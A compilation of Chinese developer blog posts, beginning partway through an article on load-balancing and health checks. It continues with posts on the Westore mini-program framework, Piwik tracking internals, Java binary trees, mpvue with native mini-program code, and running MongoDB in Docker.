        这也是一种动态负载均衡策略，它的本质是根据每个节点对过去一段时间内的响应情况来分配，响应越快分配的越多。具体的运作方式也有很多，上图的这种可以理解为，将最近一段时间的请求耗时的平均值记录下来，结合前面的「加权轮询」来处理，所以等价于2：1：3的加权轮询。
 
        题外话：一般来说，同机房下的延迟基本没什么差异，响应时间的差异主要在服务的处理能力上。如果在跨地域（例：浙江->上海，还是浙江->北京）的一些请求处理中运用，大多数情况会使用定时「ping」的方式来获取延迟情况，因为是OSI的L3转发，数据更干净，准确性更高。
 
05  Hash法

        hash法的负载均衡与之前的几种不同在于，它的结果是由客户端决定的。通过客户端带来的某个标识经过一个标准化的散列函数进行打散分摊。
 
        上图中的散列函数运用的是最简单粗暴的「取余法」。
        题外话：散列函数除了取余之外，还有诸如「变基」、「折叠」、「平方取中法」等等，此处不做展开，有兴趣的小伙伴可自行查阅资料。
 
        另外，被求余的参数其实可以是任意的，只要最终转化成一个整数参与运算即可。最常用的应该是用来源ip地址作为参数，这样可以确保相同的客户端请求尽可能落在同一台服务器上。
 
 

三、常用「负载均衡」策略优缺点和适用场景
        我们知道，没有完美的事物，负载均衡策略也是一样。上面列举的这些最常用的策略也有各自的优缺点和适用场景，我稍作了整理，如下。
 

 
        这些负载均衡算法之所以常用也是因为简单，想要更优的效果，必然就需要更高的复杂度。比如，可以将简单的策略组合使用、或者通过更多维度的数据采样来综合评估、甚至是基于进行数据挖掘后的预测算法来做。
 
 

四、用「健康探测」来保障高可用
        不管是什么样的策略，难免会遇到机器故障或者程序故障的情况。所以要确保负载均衡能更好的起到效果，还需要结合一些「健康探测」机制。定时的去探测服务端是不是还能连上，响应是不是超出预期的慢。如果节点属于“不可用”的状态的话，需要将这个节点临时从待选取列表中移除，以提高可用性。一般常用的「健康探测」方式有3种。
 
01  HTTP探测
        使用Get/Post的方式请求服务端的某个固定的URL，判断返回的内容是否符合预期。一般使用Http状态码、response中的内容来判断。
 
02  TCP探测
        基于Tcp的三次握手机制来探测指定的IP + 端口。最佳实践可以借鉴阿里云的SLB机制，如下图。

▲图片来源于阿里云，版权归原作者所有
        值得注意的是，为了尽早释放连接，在三次握手结束后立马跟上RST来中断TCP连接。
 
03  UDP探测
        可能有部分应用使用的UDP协议。在此协议下可以通过报文来进行探测指定的IP + 端口。最佳实践同样可以借鉴阿里云的SLB机制，如下图。

▲图片来源于阿里云，版权归原作者所有
 
        结果的判定方式是：在服务端没有返回任何信息的情况下，默认正常状态。否则会返回一个ICMP的报错信息。
 
 

五、结语
        用一句话来概括负载均衡的本质是：

        将请求或者说流量，以期望的规则分摊到多个操作单元上进行执行。






        通过它可以实现横向扩展（scale out），将冗余的作用发挥为「高可用」。另外，还可以物尽其用，提升资源使用率。
 
 
相关文章：


分布式系统关注点——初识「高可用」












 
 
 
作者：Zachary（个人微信号：Zachary-ZF）
微信公众号（首发）：跨界架构师。<-- 点击后阅读热门文章，或右侧扫码关注 -->
定期发表原创内容：架构设计丨分布式系统丨产品丨运营丨一些深度思考。
********************************************************************************************************************************************************************************************************
小程序解决方案 Westore - 组件、纯组件、插件开发
数据流转
先上一张图看清 Westore 怎么解决小程序数据难以管理和维护的问题:

非纯组件的话，可以直接省去 triggerEvent 的过程，直接修改 store.data 并且 update，形成缩减版单向数据流。
Github: https://github.com/dntzhang/westore
组件
这里说的组件便是自定义组件，使用原生小程序的开发格式如下:

Component({
  properties: { },

  data: { },

  methods: { }
})
使用 Westore 之后:
import create from '../../utils/create'

create({
  properties: { },

  data: { },

  methods: { }
})
看着差别不大，但是区别：

Component 的方式使用 setData 更新视图
create 的方式直接更改 store.data 然后调用 update
create 的方式可以使用函数属性，Component 不可以，如：

export default {
  data: {
    firstName: 'dnt',
    lastName: 'zhang',
    fullName:function(){
      return this.firstName + this.lastName
    }
  }
}
绑定到视图:
<view>{{fullName}}</view>
小程序 setData 的痛点:

使用 this.data 可以获取内部数据和属性值，但不要直接修改它们，应使用 setData 修改
setData 编程体验不好，很多场景直接赋值更加直观方便
setData 卡卡卡慢慢慢，JsCore 和 Webview 数据对象来回传浪费计算资源和内存资源
组件间通讯或跨页通讯会把程序搞得乱七八糟，变得极难维护和扩展

没使用 westore 的时候经常可以看到这样的代码:

使用完 westore 之后:

上面两种方式也可以混合使用。
可以看到，westore 不仅支持直接赋值，而且 this.update 兼容了 this.setData 的语法，但性能大大优于 this.setData，再举个例子：
this.store.data.motto = 'Hello Westore'
this.store.data.b.arr.push({ name: 'ccc' })
this.update()
等同于
this.update({
  motto:'Hello Westore',
  [`b.arr[${this.store.data.b.arr.length}]`]:{name:'ccc'}
})
这里需要特别强调，虽然 this.update 可以兼容小程序的 this.setData 的方式传参，但是更加智能，this.update 会先 Diff 然后 setData。原理:

纯组件
常见纯组件由很多，如 tip、alert、dialog、pager、日历等，与业务数据无直接耦合关系。
组件的显示状态由传入的 props 决定，与外界的通讯通过内部 triggerEvent 暴露的回调。
triggerEvent 的回调函数可以改变全局状态，实现单向数据流同步所有状态给其他兄弟、堂兄、姑姑等组件或者其他页面。
Westore里可以使用 create({ pure: true }) 创建纯组件（当然也可以直接使用 Component），比如 ：

import create from '../../utils/create'

create({
  pure : true,
  
  properties: {
    text: {
      type: String,
      value: '',
      observer(newValue, oldValue) { }
    }
  },

  data: {
    privateData: 'privateData'
  },

  ready: function () {
    console.log(this.properties.text)
  },

  methods: {
    onTap: function(){
      this.store.data.privateData = '成功修改 privateData'
      this.update()
      this.triggerEvent('random', {rd:'成功发起单向数据流' + Math.floor( Math.random()*1000)})
    }
  }
})
需要注意的是，加上 pure : true 之后就是纯组件，组件的 data 不会被合并到全局的 store.data 上。
组件区分业务组件和纯组件，他们的区别如下：

业务组件与业务数据紧耦合，换一个项目可能该组件就用不上，除非非常类似的项目
业务组件通过 store 获得所需参数，通过更改 store 与外界通讯
业务组件也可以通过 props 获得所需参数，通过 triggerEvent 与外界通讯
纯组件与业务数据无关，可移植和复用
纯组件只能通过 props 获得所需参数，通过 triggerEvent 与外界通讯

大型项目一定会包含纯组件、业务组件。通过纯组件，可以很好理解单向数据流。
小程序插件

小程序插件是对一组 JS 接口、自定义组件或页面的封装，用于嵌入到小程序中使用。插件不能独立运行，必须嵌入在其他小程序中才能被用户使用；而第三方小程序在使用插件时，也无法看到插件的代码。因此，插件适合用来封装自己的功能或服务，提供给第三方小程序进行展示和使用。
插件开发者可以像开发小程序一样编写一个插件并上传代码，在插件发布之后，其他小程序方可调用。小程序平台会托管插件代码，其他小程序调用时，上传的插件代码会随小程序一起下载运行。

插件开发者文档
插件使用者文档

插件开发
Westore 提供的目录如下:
|--components
|--westore  
|--plugin.json  
|--store.js
创建插件:
import create from '../../westore/create-plugin'
import store from '../../store'

//最外层容器节点需要传入 store，其他组件不传 store
create(store, {
  properties:{
    authKey:{
      type: String,
      value: ''
    }
  },
  data: { list: [] },
  attached: function () {
    // 可以得到插件上声明传递过来的属性值
    console.log(this.properties.authKey)
    // 监听所有变化
    this.store.onChange = (detail) => {
      this.triggerEvent('listChange', detail)
    }
    // 可以在这里发起网络请求获取插件的数据
    this.store.data.list = [{
      name: '电视',
      price: 1000
    }, {
      name: '电脑',
      price: 4000
    }, {
      name: '手机',
      price: 3000
    }]

    this.update()

    //同样也直接和兼容 setData 语法
    this.update(
        { 'list[2].price': 100000 }
    )
  }
})
在你的小程序中使用组件：
<list auth-key="{{authKey}}" bind:listChange="onListChange" />
这里来梳理下小程序自定义组件插件怎么和使用它的小程序通讯:

通过 properties 传入更新插件，通过 properties 的 observer 来更新插件
通过 store.onChange 收集 data 的所有变更
通过 triggerEvent 来抛事件给使用插件外部的小程序

这么方便简洁还不赶紧试试 Westore插件开发模板 ！
特别强调
插件内所有组件公用的 store 和插件外小程序的 store 是相互隔离的。
原理
页面生命周期函数



名称
描述




onLoad
监听页面加载


onShow
监听页面显示


onReady
监听页面初次渲染完成


onHide
监听页面隐藏


onUnload
监听页面卸载



组件生命周期函数



名称
描述




created
在组件实例进入页面节点树时执行，注意此时不能调用 setData


attached
在组件实例进入页面节点树时执行


ready
在组件布局完成后执行，此时可以获取节点信息（使用 SelectorQuery ）


moved
在组件实例被移动到节点树另一个位置时执行


detached
在组件实例被从页面节点树移除时执行



由于开发插件时候的组件没有 this.page，所以 store 是从根组件注入，而且可以在 attached 提前注入:
export default function create(store, option) {
    let opt = store
    if (option) {
        opt = option
        originData = JSON.parse(JSON.stringify(store.data))
        globalStore = store
        globalStore.instances = []
        create.store = globalStore
    }

    const attached = opt.attached
    opt.attached = function () {
        this.store = globalStore
        this.store.data = Object.assign(globalStore.data, opt.data)
        this.setData.call(this, this.store.data)
        globalStore.instances.push(this)
        rewriteUpdate(this)
        attached && attached.call(this)
    }
    Component(opt)
}
总结

组件 - 对 WXML、WXSS 和 JS 的封装，与业务耦合，可复用，难移植
纯组件 - 对 WXML、WXSS 和 JS 的封装，与业务解耦，可复用，易移植
插件 - 小程序插件是对一组 JS 接口、自定义组件或页面的封装，与业务耦合，可复用

Star & Fork 小程序解决方案
https://github.com/dntzhang/westore
License
MIT @dntzhang

********************************************************************************************************************************************************************************************************
开源网站流量统计系统Piwik源码分析——后台处理（二）
　　在第一篇文章中，重点介绍了脚本需要搜集的数据，而本篇主要介绍的是服务器端如何处理客户端发送过来的请求和参数。
一、设备信息检测
　　通过分析User-Agent请求首部（如下图红线框出的部分），可以得到相关的设备信息。
 
　　Piwik系统专门有一套代码用来分析代理信息，还独立了出来，叫做DeviceDetector。它有一个专门的demo页面，可以展示其功能，点进去后可以看到下图中的内容。

　　它能检测出浏览器名称、浏览器的渲染引擎、浏览器的版本、设备品牌（例如HTC、Apple、HP等）、设备型号（例如iPad、Nexus 5、Galaxy S5等）、设备类别（例如desktop、smartphone、tablet等），这6类数据中的可供选择的关键字，可以参考“List of segments”或插件的“readme”。顺便说一下，Piwik还能获取到访客的定位信息，在“List of segments”中，列举出了城市、经纬度等信息，其原理暂时还没研究。
　　Piwik为大部分设备信息的关键字配备了一个icon图标，所有的icon图标被放置在“plugins\Morpheus\icons”中，包括浏览器、设备、国旗、操作系统等，下图截取的是浏览器中的部分图标。

二、IP地址
　　在Piwik系统的后台设置中，可以选择IP地址的获取方式（如下图所示）。在官方博客的一篇《Geo Locate your visitors》博文中提到，3.5版本后可以在系统中嵌入MaxMind公司提供的IP地理定位服务（GeoIP2）。

　　下面是一张看官方的产品介绍表，从描述中可看出这是一项非常厉害的服务。不过需要注意的是，这是一项付费服务。

三、日志数据和归档数据
　　在官方发布的说明文档《How Matomo (formerly Piwik) Works》中提到，在Piwik中有两种数据类型：日志数据和归档数据。日志数据（Log Data）是一种原始分析数据，从客户端发送过来的参数就是日志数据，刚刚设备检测到的信息也是日志数据，还有其它的一些日志数据的来源，暂时还没细究。由于日志数据非常巨大，因此不能直接生成最终用户可看的报告，得使用归档数据来生成报告。归档数据（Archive Data）是以日志数据为基础而构建出来的，它是一种被缓存并且可用于生成报告的聚合分析数据。
　　日志数据会通过“core\Piwik\Tracker\Visit.php”中的方法保存到数据库中，其中核心的方法如下所示，注释中也强调了该方法中的内容是处理请求的主要逻辑。该方法涉及到了很多对象，以及对象的方法，错综复杂，我自己也没有研究透，只是利用PHPStorm编辑器自动索引，查找出了一些关联，具体细节还有待考证。

/**
 *  Main algorithm to handle the visit.
 *
 *  Once we have the visitor information, we have to determine if the visit is a new or a known visit.
 *
 * 1) When the last action was done more than 30min ago,
 *      or if the visitor is new, then this is a new visit.
 *
 * 2) If the last action is less than 30min ago, then the same visit is going on.
 *    Because the visit goes on, we can get the time spent during the last action.
 *
 * NB:
 *  - In the case of a new visit, then the time spent
 *    during the last action of the previous visit is unknown.
 *
 *    - In the case of a new visit but with a known visitor,
 *    we can set the 'returning visitor' flag.
 *
 * In all the cases we set a cookie to the visitor with the new information.
 */
public function handle() {
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::manipulateRequest()...");
        $processor->manipulateRequest($this->request);
    }
    $this->visitProperties = new VisitProperties();
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::processRequestParams()...");
        $abort = $processor->processRequestParams($this->visitProperties, $this->request);
        if ($abort) {
            Common::printDebug("-> aborting due to processRequestParams method");
            return;
        }
    }
    $isNewVisit = $this->request->getMetadata('CoreHome', 'isNewVisit');
    if (!$isNewVisit) {
        $isNewVisit = $this->triggerPredicateHookOnDimensions($this->getAllVisitDimensions() , 'shouldForceNewVisit');
        $this->request->setMetadata('CoreHome', 'isNewVisit', $isNewVisit);
    }
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::afterRequestProcessed()...");
        $abort = $processor->afterRequestProcessed($this->visitProperties, $this->request);
        if ($abort) {
            Common::printDebug("-> aborting due to afterRequestProcessed method");
            return;
        }
    }
    $isNewVisit = $this->request->getMetadata('CoreHome', 'isNewVisit');
    // Known visit when:
    // ( - the visitor has the Piwik cookie with the idcookie ID used by Piwik to match the visitor
    //   OR
    //   - the visitor doesn't have the Piwik cookie but could be match using heuristics @see recognizeTheVisitor()
    // )
    // AND
    // - the last page view for this visitor was less than 30 minutes ago @see isLastActionInTheSameVisit()
    if (!$isNewVisit) {
        try {
            $this->handleExistingVisit($this->request->getMetadata('Goals', 'visitIsConverted'));
        }
        catch(VisitorNotFoundInDb $e) {
            $this->request->setMetadata('CoreHome', 'visitorNotFoundInDb', true); // TODO: perhaps we should just abort here?
            
        }
    }
    // New visit when:
    // - the visitor has the Piwik cookie but the last action was performed more than 30 min ago @see isLastActionInTheSameVisit()
    // - the visitor doesn't have the Piwik cookie, and couldn't be matched in @see recognizeTheVisitor()
    // - the visitor does have the Piwik cookie but the idcookie and idvisit found in the cookie didn't match to any existing visit in the DB
    if ($isNewVisit) {
        $this->handleNewVisit($this->request->getMetadata('Goals', 'visitIsConverted'));
    }
    // update the cookie with the new visit information
    $this->request->setThirdPartyCookie($this->request->getVisitorIdForThirdPartyCookie());
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::recordLogs()...");
        $processor->recordLogs($this->visitProperties, $this->request);
    }
    $this->markArchivedReportsAsInvalidIfArchiveAlreadyFinished();
}

 　　最后了解一下Piwik的数据库设计，此处只分析与日志数据和归档数据有关的数据表。官方的说明文档曾介绍，日志数据有5张相关的数据表，我对于表的内在含义还比较模糊，因此下面所列的描述还不是很清晰。
（1）log_visit：每次访问都会生成一条访问者记录，表中的字段可参考“Visits”。
（2）log_action：网站上的访问和操作类型（例如特定URL、网页标题），可分析出访问者感兴趣的页面，表中的字段可参考“Action Types”。
（3）log_link_visit_action：访问者在浏览期间执行的操作，表中的字段可参考“Visit Actions”。
（4）log_conversion：访问期间发生的转化（与目标相符的操作），表中的字段可参考“Conversions”。
（5）log_conversion_item：与电子商务相关的信息，表中的字段可参考“Ecommerce items”。
　　归档数据的表有两种前缀，分别是“archive_numeric_”和“archive_blob_”，表的字段可参考“Archive data”。通过对字段的观察可知，两种最大的不同就是value字段的数据类型。archive_numeric_* 表中的value能储存数值（数据类型是Double），而archive_blob_* 表中的value能储存出数字以外的其他任何数据（数据类型是Blob）。
　　两种表都是动态生成的，因此前缀的后面都用“*”表示。生成规则可按年、月、周、天或自定义日期范围，不设置的话，默认是按月计算，例如archive_numeric_2018_09、archive_blob_2018_09。
 
参考资料：
开源网站分析软件Piwik的数据库表结构
Piwik运转原理
How Matomo (formerly Piwik) Works
Database schema
数据分析技术白皮书
What data does Matomo track?
Segmentation in the API
device-detector
Device Detector demo page
Geo Locate your visitors
 
********************************************************************************************************************************************************************************************************
Android版数据结构与算法(六):树与二叉树
版权声明：本文出自汪磊的博客，未经作者允许禁止转载。
 之前的篇章主要讲解了数据结构中的线性结构，所谓线性结构就是数据与数据之间是一对一的关系，接下来我们就要进入非线性结构的世界了，主要是树与图，好了接下来我们将会了解到树以及二叉树，二叉平衡树，赫夫曼树等原理以及java代码的实现，先从最基础的开始学习吧。
一、树
树的定义：
树是n(n>=0)个结点的有限集合。
当n=0时，集合为空,称为空树。
在任意一颗非空树中，有且仅有一个特定的结点称为根。
当n>1时,除根结点以外的其余结点可分成m(m>=0)个不相交的有限结点集合T1,T2….Tm.其中每个集合本身也是一棵树,称为根的子树。
如下图就是一棵树:

可以看到，树这种数据结构数据之间是一对一或者一对多关系，不再是一对一的关系
在上图中节点A叫做整棵树的根节点，一棵树中只有一个根节点。
根节点可以生出多个孩子节点，孩子节点又可以生出多个孩子节点。比如A的孩子节点为B和C，D的孩子节点为G，H，I。
每个孩子节点只有一个父节点，比如D的父节点为B，E的父节点为C。
好了，关于树的定义介绍到这，很简单。
二、树的相关术语

 
节点的度
节点含有的子树个数，叫做节点的度。度为0的节点成为叶子结点或终端结点。比如上图中D的度为3，E的度为1.
G,H,I,J的度为0，叫做叶子结点。
树的度
 一棵树中 最大节点的度树的度。比如上图中树的度为3
结点的层次
从根结点算起，为第一层，其余依次类推如上图。B,C的层次为2，G,H的层次为4。
树中节点的最大层次称为树的高度或深度。上图中树的高度或深度为4
三、树的存储结构
简单的顺序存储不能满足树的实现，需要结合顺序存储和链式存储来解决。
树的存储方式主要有三种：
双亲表示法：每个节点不仅保存自己数据还附带一个指示器指示其父节点的角标，这种方式可以用数组来存储。
如图：

这种存储方式特点是：查找一个节点的孩子节点会很麻烦但是查找其父节点很简单。
孩子表示法：每个节点不仅保存自己数据信息还附带指示其孩子的指示器，这种方式用链表来存储比较合适。
如图：

这种存储方式特点是：查找一个节点的父亲节点会很麻烦但是查找其孩子节点很简单。
理想表示法：数组+链表的存储方式，把每个结点的孩子结点排列起来，以单链表方式连接起来，则n个孩子有n个孩子链表，如果是叶子结点则此链表为空，然后n个头指针又组成线性表，采用顺序存储方式，存储在一个一维数组中。
如图：

这种方式查找父节点与孩子结点都比较简便。
以上主要介绍了树的一些概念以及存储方式介绍，实际我们用的更多的是二叉树，接下来我们看下二叉树。
四、二叉树的概念
二叉树定义：二叉树是n（n>=0）个结点的有限集合，该集合或者为空，或者由一个根结点和两课互不相交的，分别称为根结点左子树和右子树的二叉树组成。
用人话说，二叉树是每个节点至多有两个子树的树。
如图就是一颗二叉树：
 
 
五、特殊二叉树
斜树：所有结点只有左子树的二叉树叫做左斜树，所有结点只有右子树的二叉树叫做右斜树。
如图：

满二叉树：在一棵二叉树中，所有分支结点都有左子树与右子树，并且所有叶子结点都在同一层则为满二叉树。
如图：

完全二叉树：所有叶子节点都出现在 k 或者 k-1 层，而且从 1 到 k-1 层必须达到最大节点数，第 k 层可是不是慢的，但是第 k 层的所有节点必须集中在最左边。
如图：

 
 六、二叉树的遍历
二叉树的遍历主要有三种：先序遍历，中序遍历，后续遍历，接下来我们挨个了解一下。
先序遍历：先访问根结点，再先序遍历左子树，再先序遍历右子树。
如图所示：
 

先序遍历结果为：ABDGHCEIF
中序遍历：先中序遍历左子树，再访问根结点，再中序遍历右子树。
如图：

中序遍历结果为：GDHBAEICF
后序遍历：先后序遍历左子树，再后序遍历右子树，再访问根结点。
如图：

后序遍历结果：GHDBIEFCA
七、java实现二叉树
先来看看每个结点类：

 1     public class TreeNode{
 2         private String data;//自己结点数据
 3         private TreeNode leftChild;//左孩子
 4         private TreeNode rightChild;//右孩子
 5         
 6         public String getData() {
 7             return data;
 8         }
 9         
10         public void setData(String data) {
11             this.data = data;
12         }
13         
14         public TreeNode(String data){
15             this.data = data;
16             this.leftChild = null;
17             this.rightChild = null;
18         }
19     }

很简单，每个结点信息包含自己结点数据以及指向左右孩子的指针（为了方便，我这里就叫指针了）。
二叉树的创建
我们创建如下二叉树：

代码实现：

public class BinaryTree {
    private TreeNode  root = null;

    public TreeNode getRoot() {
        return root;
    }

    public BinaryTree(){
        root = new TreeNode("A");
    }
    
    /**
     * 构建二叉树
     *          A
     *     B        C
     *  D    E    F   G
     */
    public void createBinaryTree(){
        TreeNode nodeB = new TreeNode("B");
        TreeNode nodeC = new TreeNode("C");
        TreeNode nodeD = new TreeNode("D");
        TreeNode nodeE = new TreeNode("E");
        TreeNode nodeF = new TreeNode("F");
        TreeNode nodeG = new TreeNode("G");
        root.leftChild = nodeB;
        root.rightChild = nodeC;
        nodeB.leftChild = nodeD;
        nodeB.rightChild = nodeE;
        nodeC.leftChild = nodeF;
        nodeC.rightChild = nodeG;
    }
        。。。。。。。
}

创建BinaryTree的时候就已经创建根结点A，createBinaryTree()方法中创建其余结点并且建立相应关系。
获得二叉树的高度
树中节点的最大层次称为树的高度，因此获得树的高度需要递归获取所有节点的高度，取最大值。

     /**
     * 求二叉树的高度
     * @author Administrator
     *
     */
    public int getHeight(){
        return getHeight(root);
    }
    
    private int getHeight(TreeNode node) {
        if(node == null){
            return 0;
        }else{
            int i = getHeight(node.leftChild);
            int j = getHeight(node.rightChild);
            return (i<j)?j+1:i+1;
        }
    }        

获取二叉树的结点数
获取二叉树结点总数，需要遍历左右子树然后相加

 1     /**
 2      * 获取二叉树的结点数
 3      * @author Administrator
 4      *
 5      */
 6     public int getSize(){
 7         return getSize(root);
 8     }
 9     
10     private int getSize(TreeNode node) {
11         if(node == null){
12             return 0;
13         }else{
14             return 1+getSize(node.leftChild)+getSize(node.rightChild);
15         }
16     }

二叉树的遍历
二叉树遍历分为前序遍历，中序遍历，后续遍历，主要也是递归思想，下面直接给出代码

    /**
     * 前序遍历——迭代
     * @author Administrator
     *
     */
    public void preOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            System.out.println("preOrder data:"+node.getData());
            preOrder(node.leftChild);
            preOrder(node.rightChild);
        }
    }

    /**
     * 中序遍历——迭代
     * @author Administrator
     *
     */
    public void midOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            midOrder(node.leftChild);
            System.out.println("midOrder data:"+node.getData());
            midOrder(node.rightChild);
        }
    }
    
    /**
     * 后序遍历——迭代
     * @author Administrator
     *
     */
    public void postOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            postOrder(node.leftChild);
            postOrder(node.rightChild);
            System.out.println("postOrder data:"+node.getData());
        }
    }

获取某一结点的父结点
获取结点的父节点也是递归思想，先判断当前节点左右孩子是否与给定节点信息相等，相等则当前结点即为给定结点的父节点，否则继续递归左子树，右子树。

 1 /**
 2      * 查找某一结点的父结点
 3      * @param data
 4      * @return
 5      */
 6     public TreeNode getParent(String data){
 7         //封装为内部结点信息
 8         TreeNode node = new TreeNode(data);
 9         //
10         if (root == null || node.data.equals(root.data)){
11             //根结点为null或者要查找的结点就为根结点，则直接返回null，根结点没有父结点
12             return null;
13         }
14         return getParent(root, node);//递归查找
15     }
16 
17     public TreeNode getParent(TreeNode subTree, TreeNode node) {
18 
19         if (null == subTree){//子树为null，直接返回null
20             return null;
21         }
22         //判断左或者右结点是否与给定结点相等，相等则此结点即为给定结点的父结点
23         if(subTree.leftChild.data.equals(node.data) || subTree.rightChild.data.equals(node.data)){
24             return subTree;
25         }
26         //以上都不符合，则递归查找
27         if (getParent(subTree.leftChild,node)!=null){//先查找左子树，左子树找不到查询右子树
28             return getParent(subTree.leftChild,node);
29         }else {
30             return getParent(subTree.rightChild,node);
31         }
32     }

八、总结
以上总结了树与二叉树的一些概念，重点就是二叉树的遍历以及java代码实现，比较简单，没什么多余解释，下一篇了解一下赫夫曼树以及二叉排序树。
********************************************************************************************************************************************************************************************************
小程序开发总结一：mpvue框架及与小程序原生的混搭开发
mpvue-native:小程序原生和mpvue代码共存
问题描述
mpvue和wepy等框架是在小程序出来一段时间之后才开始有的，所以会出现的问题有：需要兼容已有的老项目，有些场景对小程序的兼容要求特别高的时候需要用原生的方式开发
解决思路

mpvue的入口文件导入旧版路由配置文件
公共样式 字体图标迁移 app.wxss -> app.vue中less（mpvue的公共样式）
旧项目导入 旧项目(native)拷贝到dist打包的根目录


这个要注意的就是拷贝的旧项目不能覆盖mpvue打包文件，只要避免文件夹名字冲突即可

mpvue-native使用
yarn dev xiejun // 本地启动
yarn build xiejun // 打包
开发者工具指向目录
/dist/xiejun

github地址： https://github.com/xiejun-net/mpvue-native

mpvue-native目录结构
|----build
|----config
|----dist 打包后项目目录
    |----<projetc1>
    |----<projetc2>
|----src 源码
    |----assets 通用资源目录
    |----components 组件
    |----pages 公共页面页面
    |----utils 常用库
    |----<project> 对应单个项目的文件
        |----home mpvue页面
            |----assets
            |----App.vue
            |----main.js
        |----native 原生目录
            |----test 小程序原生页面
                |---web.js
                |---web.wxml
                |---web.wxss
                |---web.json
        |----app.json 路径、分包
        |----App.vue
        |----main.js mpvue项目入口文件
|----static 静态文件
|----package.json
拷贝旧项目到根目录下
 new CopyWebpackPlugin([
    {
    from: path.resolve(__dirname, `../src/${config.projectName}/native`),
    to: "",
    ignore: [".*"]
    }
]),
入口及页面
const appEntry = { app: resolve(`./src/${config.projectName}/main.js`) } // 各个项目入口文件
const pagesEntry = getEntry(resolve('./src'), 'pages/**/main.js') // 各个项目的公共页面
const projectEntry = getEntry(resolve('./src'), `${config.projectName}/**/main.js`) // 某个项目的mpvue页面
const entry = Object.assign({}, appEntry, pagesEntry, projectEntry)
多项目共用页面
参考web中一个项目可以有多个spa，我们也可以一个项目里包含多个小程序，多个小程序之间可以共用组件和公用页面，在某些场景下可以节省很多开发时间和维护时间。
打包的时候根据项目入口打包 yarn dev <project>
分包
旧项目作为主包
其他根据文件夹 pages xiejun 分包作为两个包加载
具体根据实际情况来分
// app.json文件配置 pages 为主包
  "pages": [
    "test/web"
  ],
  "subPackages": [
    {
      "root": "pages",
      "pages": [
        "about/main"
      ]
    },
    { 
      "root": "xiejun", 
      "pages": [
          "home/main"
        ]
    }
  ],
其他有关小程序开发坑和技巧
字体图标的使用

网页我们直接引用css就好//at.alicdn.com/t/font_263892_1oe6c1cnjiofxbt9.css

小程序只需要新建一个css文件把在线的css代码拷贝过来放置全局即可

关于小程序和mpvue生命周期
点此查看mpvue的生命周期
从官方文档上生命周期的图示上可以看到created是在onLaunch之前，也就是说每个页面的created 出发时机都是整个应用开启的时机，所以一般页面里面都是用mouted 来请求数据的。
如何判断小程序当前环境
问题描述
发布小程序的时候经常担心配置错误的服务器环境
而小程序官方没有提供任何关于判断小程序是体验版还是开发版本的api
解决方案
熟悉小程序开发的不难发现小程序https请求的时候的referer是有规律的：https://servicewechat.com/${appId}/${env}/page-frame.html
即链接中包含了当前小程序的appId

开发工具中 appId紧接着的dev是 devtools
设备上 开发或者体验版 appId紧接着的env是 0
设备上 正式发布版本 appId紧接着的env是数字 如： 20 发现是小程序的发布版本次数，20代表发布了20次

由此我们可以通过env 这个参数来判断当前是什么环境，
前端是无法获取到referer的，所以需要后端提供一个接口,返回得到referer
代码
// https://servicewechat.com/${appId}/${env}/page-frame.html
// 默认是正式环境，微信官方并没有说referer规则一定如此，保险起见 try catch
async getEnv() {
    try {
        let referer = await userService.getReferer() // 接口获取referer
        let flag = referer.match(/wx2312312312\/(\S*)\/page-frame/)[1]
        if (flag === 'devtools') { // 开发工具
            // setHostDev()
        } else if (parseInt(flag) > 0) { // 正式版本
            // setHostPro()
        } else { // 开发版本和体验版本
            // setHostTest()
        }
    } catch (e) {
        console.log(e)
    }
}
Promise
官方文档上说Promise 都支持
实际测试发现其实在ios8上是有问题的
所以request.js
import Es6Promise from 'es6-promise'
Es6Promise.polyfill()
wx.navigateto返回层级问题
官方文档是说目前可以返回10层
实际情况是在某些机型上只能返回5层 和原来一样
所以最好使用wx.navigateto跳转不超过5层
压缩兼容问题
在微信开发者工具上传代码的时候
务必把项目ES6转ES5否则会出现兼问题

个人公众号:程序员很忙（xiejun_asp）



********************************************************************************************************************************************************************************************************
Spring Boot （八）MyBatis + Docker + MongoDB 4.x
一、MongoDB简介
1.1 MongoDB介绍
MongoDB是一个强大、灵活，且易于扩展的通用型数据库。MongoDB是C++编写的文档型数据库，有着丰富的关系型数据库的功能，并在4.0之后添加了事务支持。
随着存储数据量不断的增加，开发者面临一个困难：如何扩展数据库？而扩展数据库分为横向扩展和纵向扩展，纵向扩展就是使用计算能力更强大的机器，它的缺点就是：机器性能的提升有物理极限的制约，而且大型机通常都是非常昂贵的，而MongoDB的设计采用的是横向扩展的模式，面向文档的数据模型使它很容易的在多台服务器上进行数据分割。MongoDB能自动处理夸集群的数据和负载，自动重新分配文档，这样开发者就能集中精力编写应用程序，而不需要考虑如果扩展的问题。

1.2 MongoDB安装
MongoDB的安装简单来说分为两种：

官网下载对应物理机的安装包，直接安装
使用Docker镜像，安装到Docker上

推荐使用第二种，直接使用MongoDB镜像安装到Docker上，这样带来的好处是：

安装简单、方便，且快速
更容易进行数据迁移，使用Docker可以很容易的导入和导出整个MongoDB到任何地方

所以本文将重点介绍MongoDB在Docker上的安装和使用。
如果想要直接在物理机安装Docker，可以查看我之前的一篇文章《MongoDB基础介绍安装与使用》：https://www.cnblogs.com/vipstone/p/8494347.html
1.3 Docker上安装MongoDB
在Docker上安装软件一般需要两步：

pull（下载）对应的镜像（相对于下载软件）
装载镜像到容器（相对于安装软件）

1.3.1 下载镜像
下载镜像，需要到镜像市场：https://hub.docker.com/，如要要搜索的软件“mongo”，选择官方镜像“Official”，点击详情，获取相应的下载方法，我们得到下载MongoDB的命令如下：

docker pull mongo:latest

1.3.2 装载镜像到容器
使用命令：

docker run --name mongodb1 -p 27018:27017 -d mongo:latest


--name 指定容器名称
-p 27018:27017 映射本地端口27018到容器端口27017
-d 后台运行
mongo:latest 镜像名称和标签

使用“docker images”查看镜像名称和标签，如下图：

容器装载成功之后，就可以使用Robo 3T客户端进行连接了，是不需要输入用户名和密码的，如下图：

表示已经连接成功了。
Robo 3T为免费的连接MongoDB的数据库工具，可以去官网下载：https://robomongo.org/download
1.3.3 开启身份认证
如果是生成环境，没有用户名和密码的MongoDB是非常不安全的，因此我们需要开启身份认证。
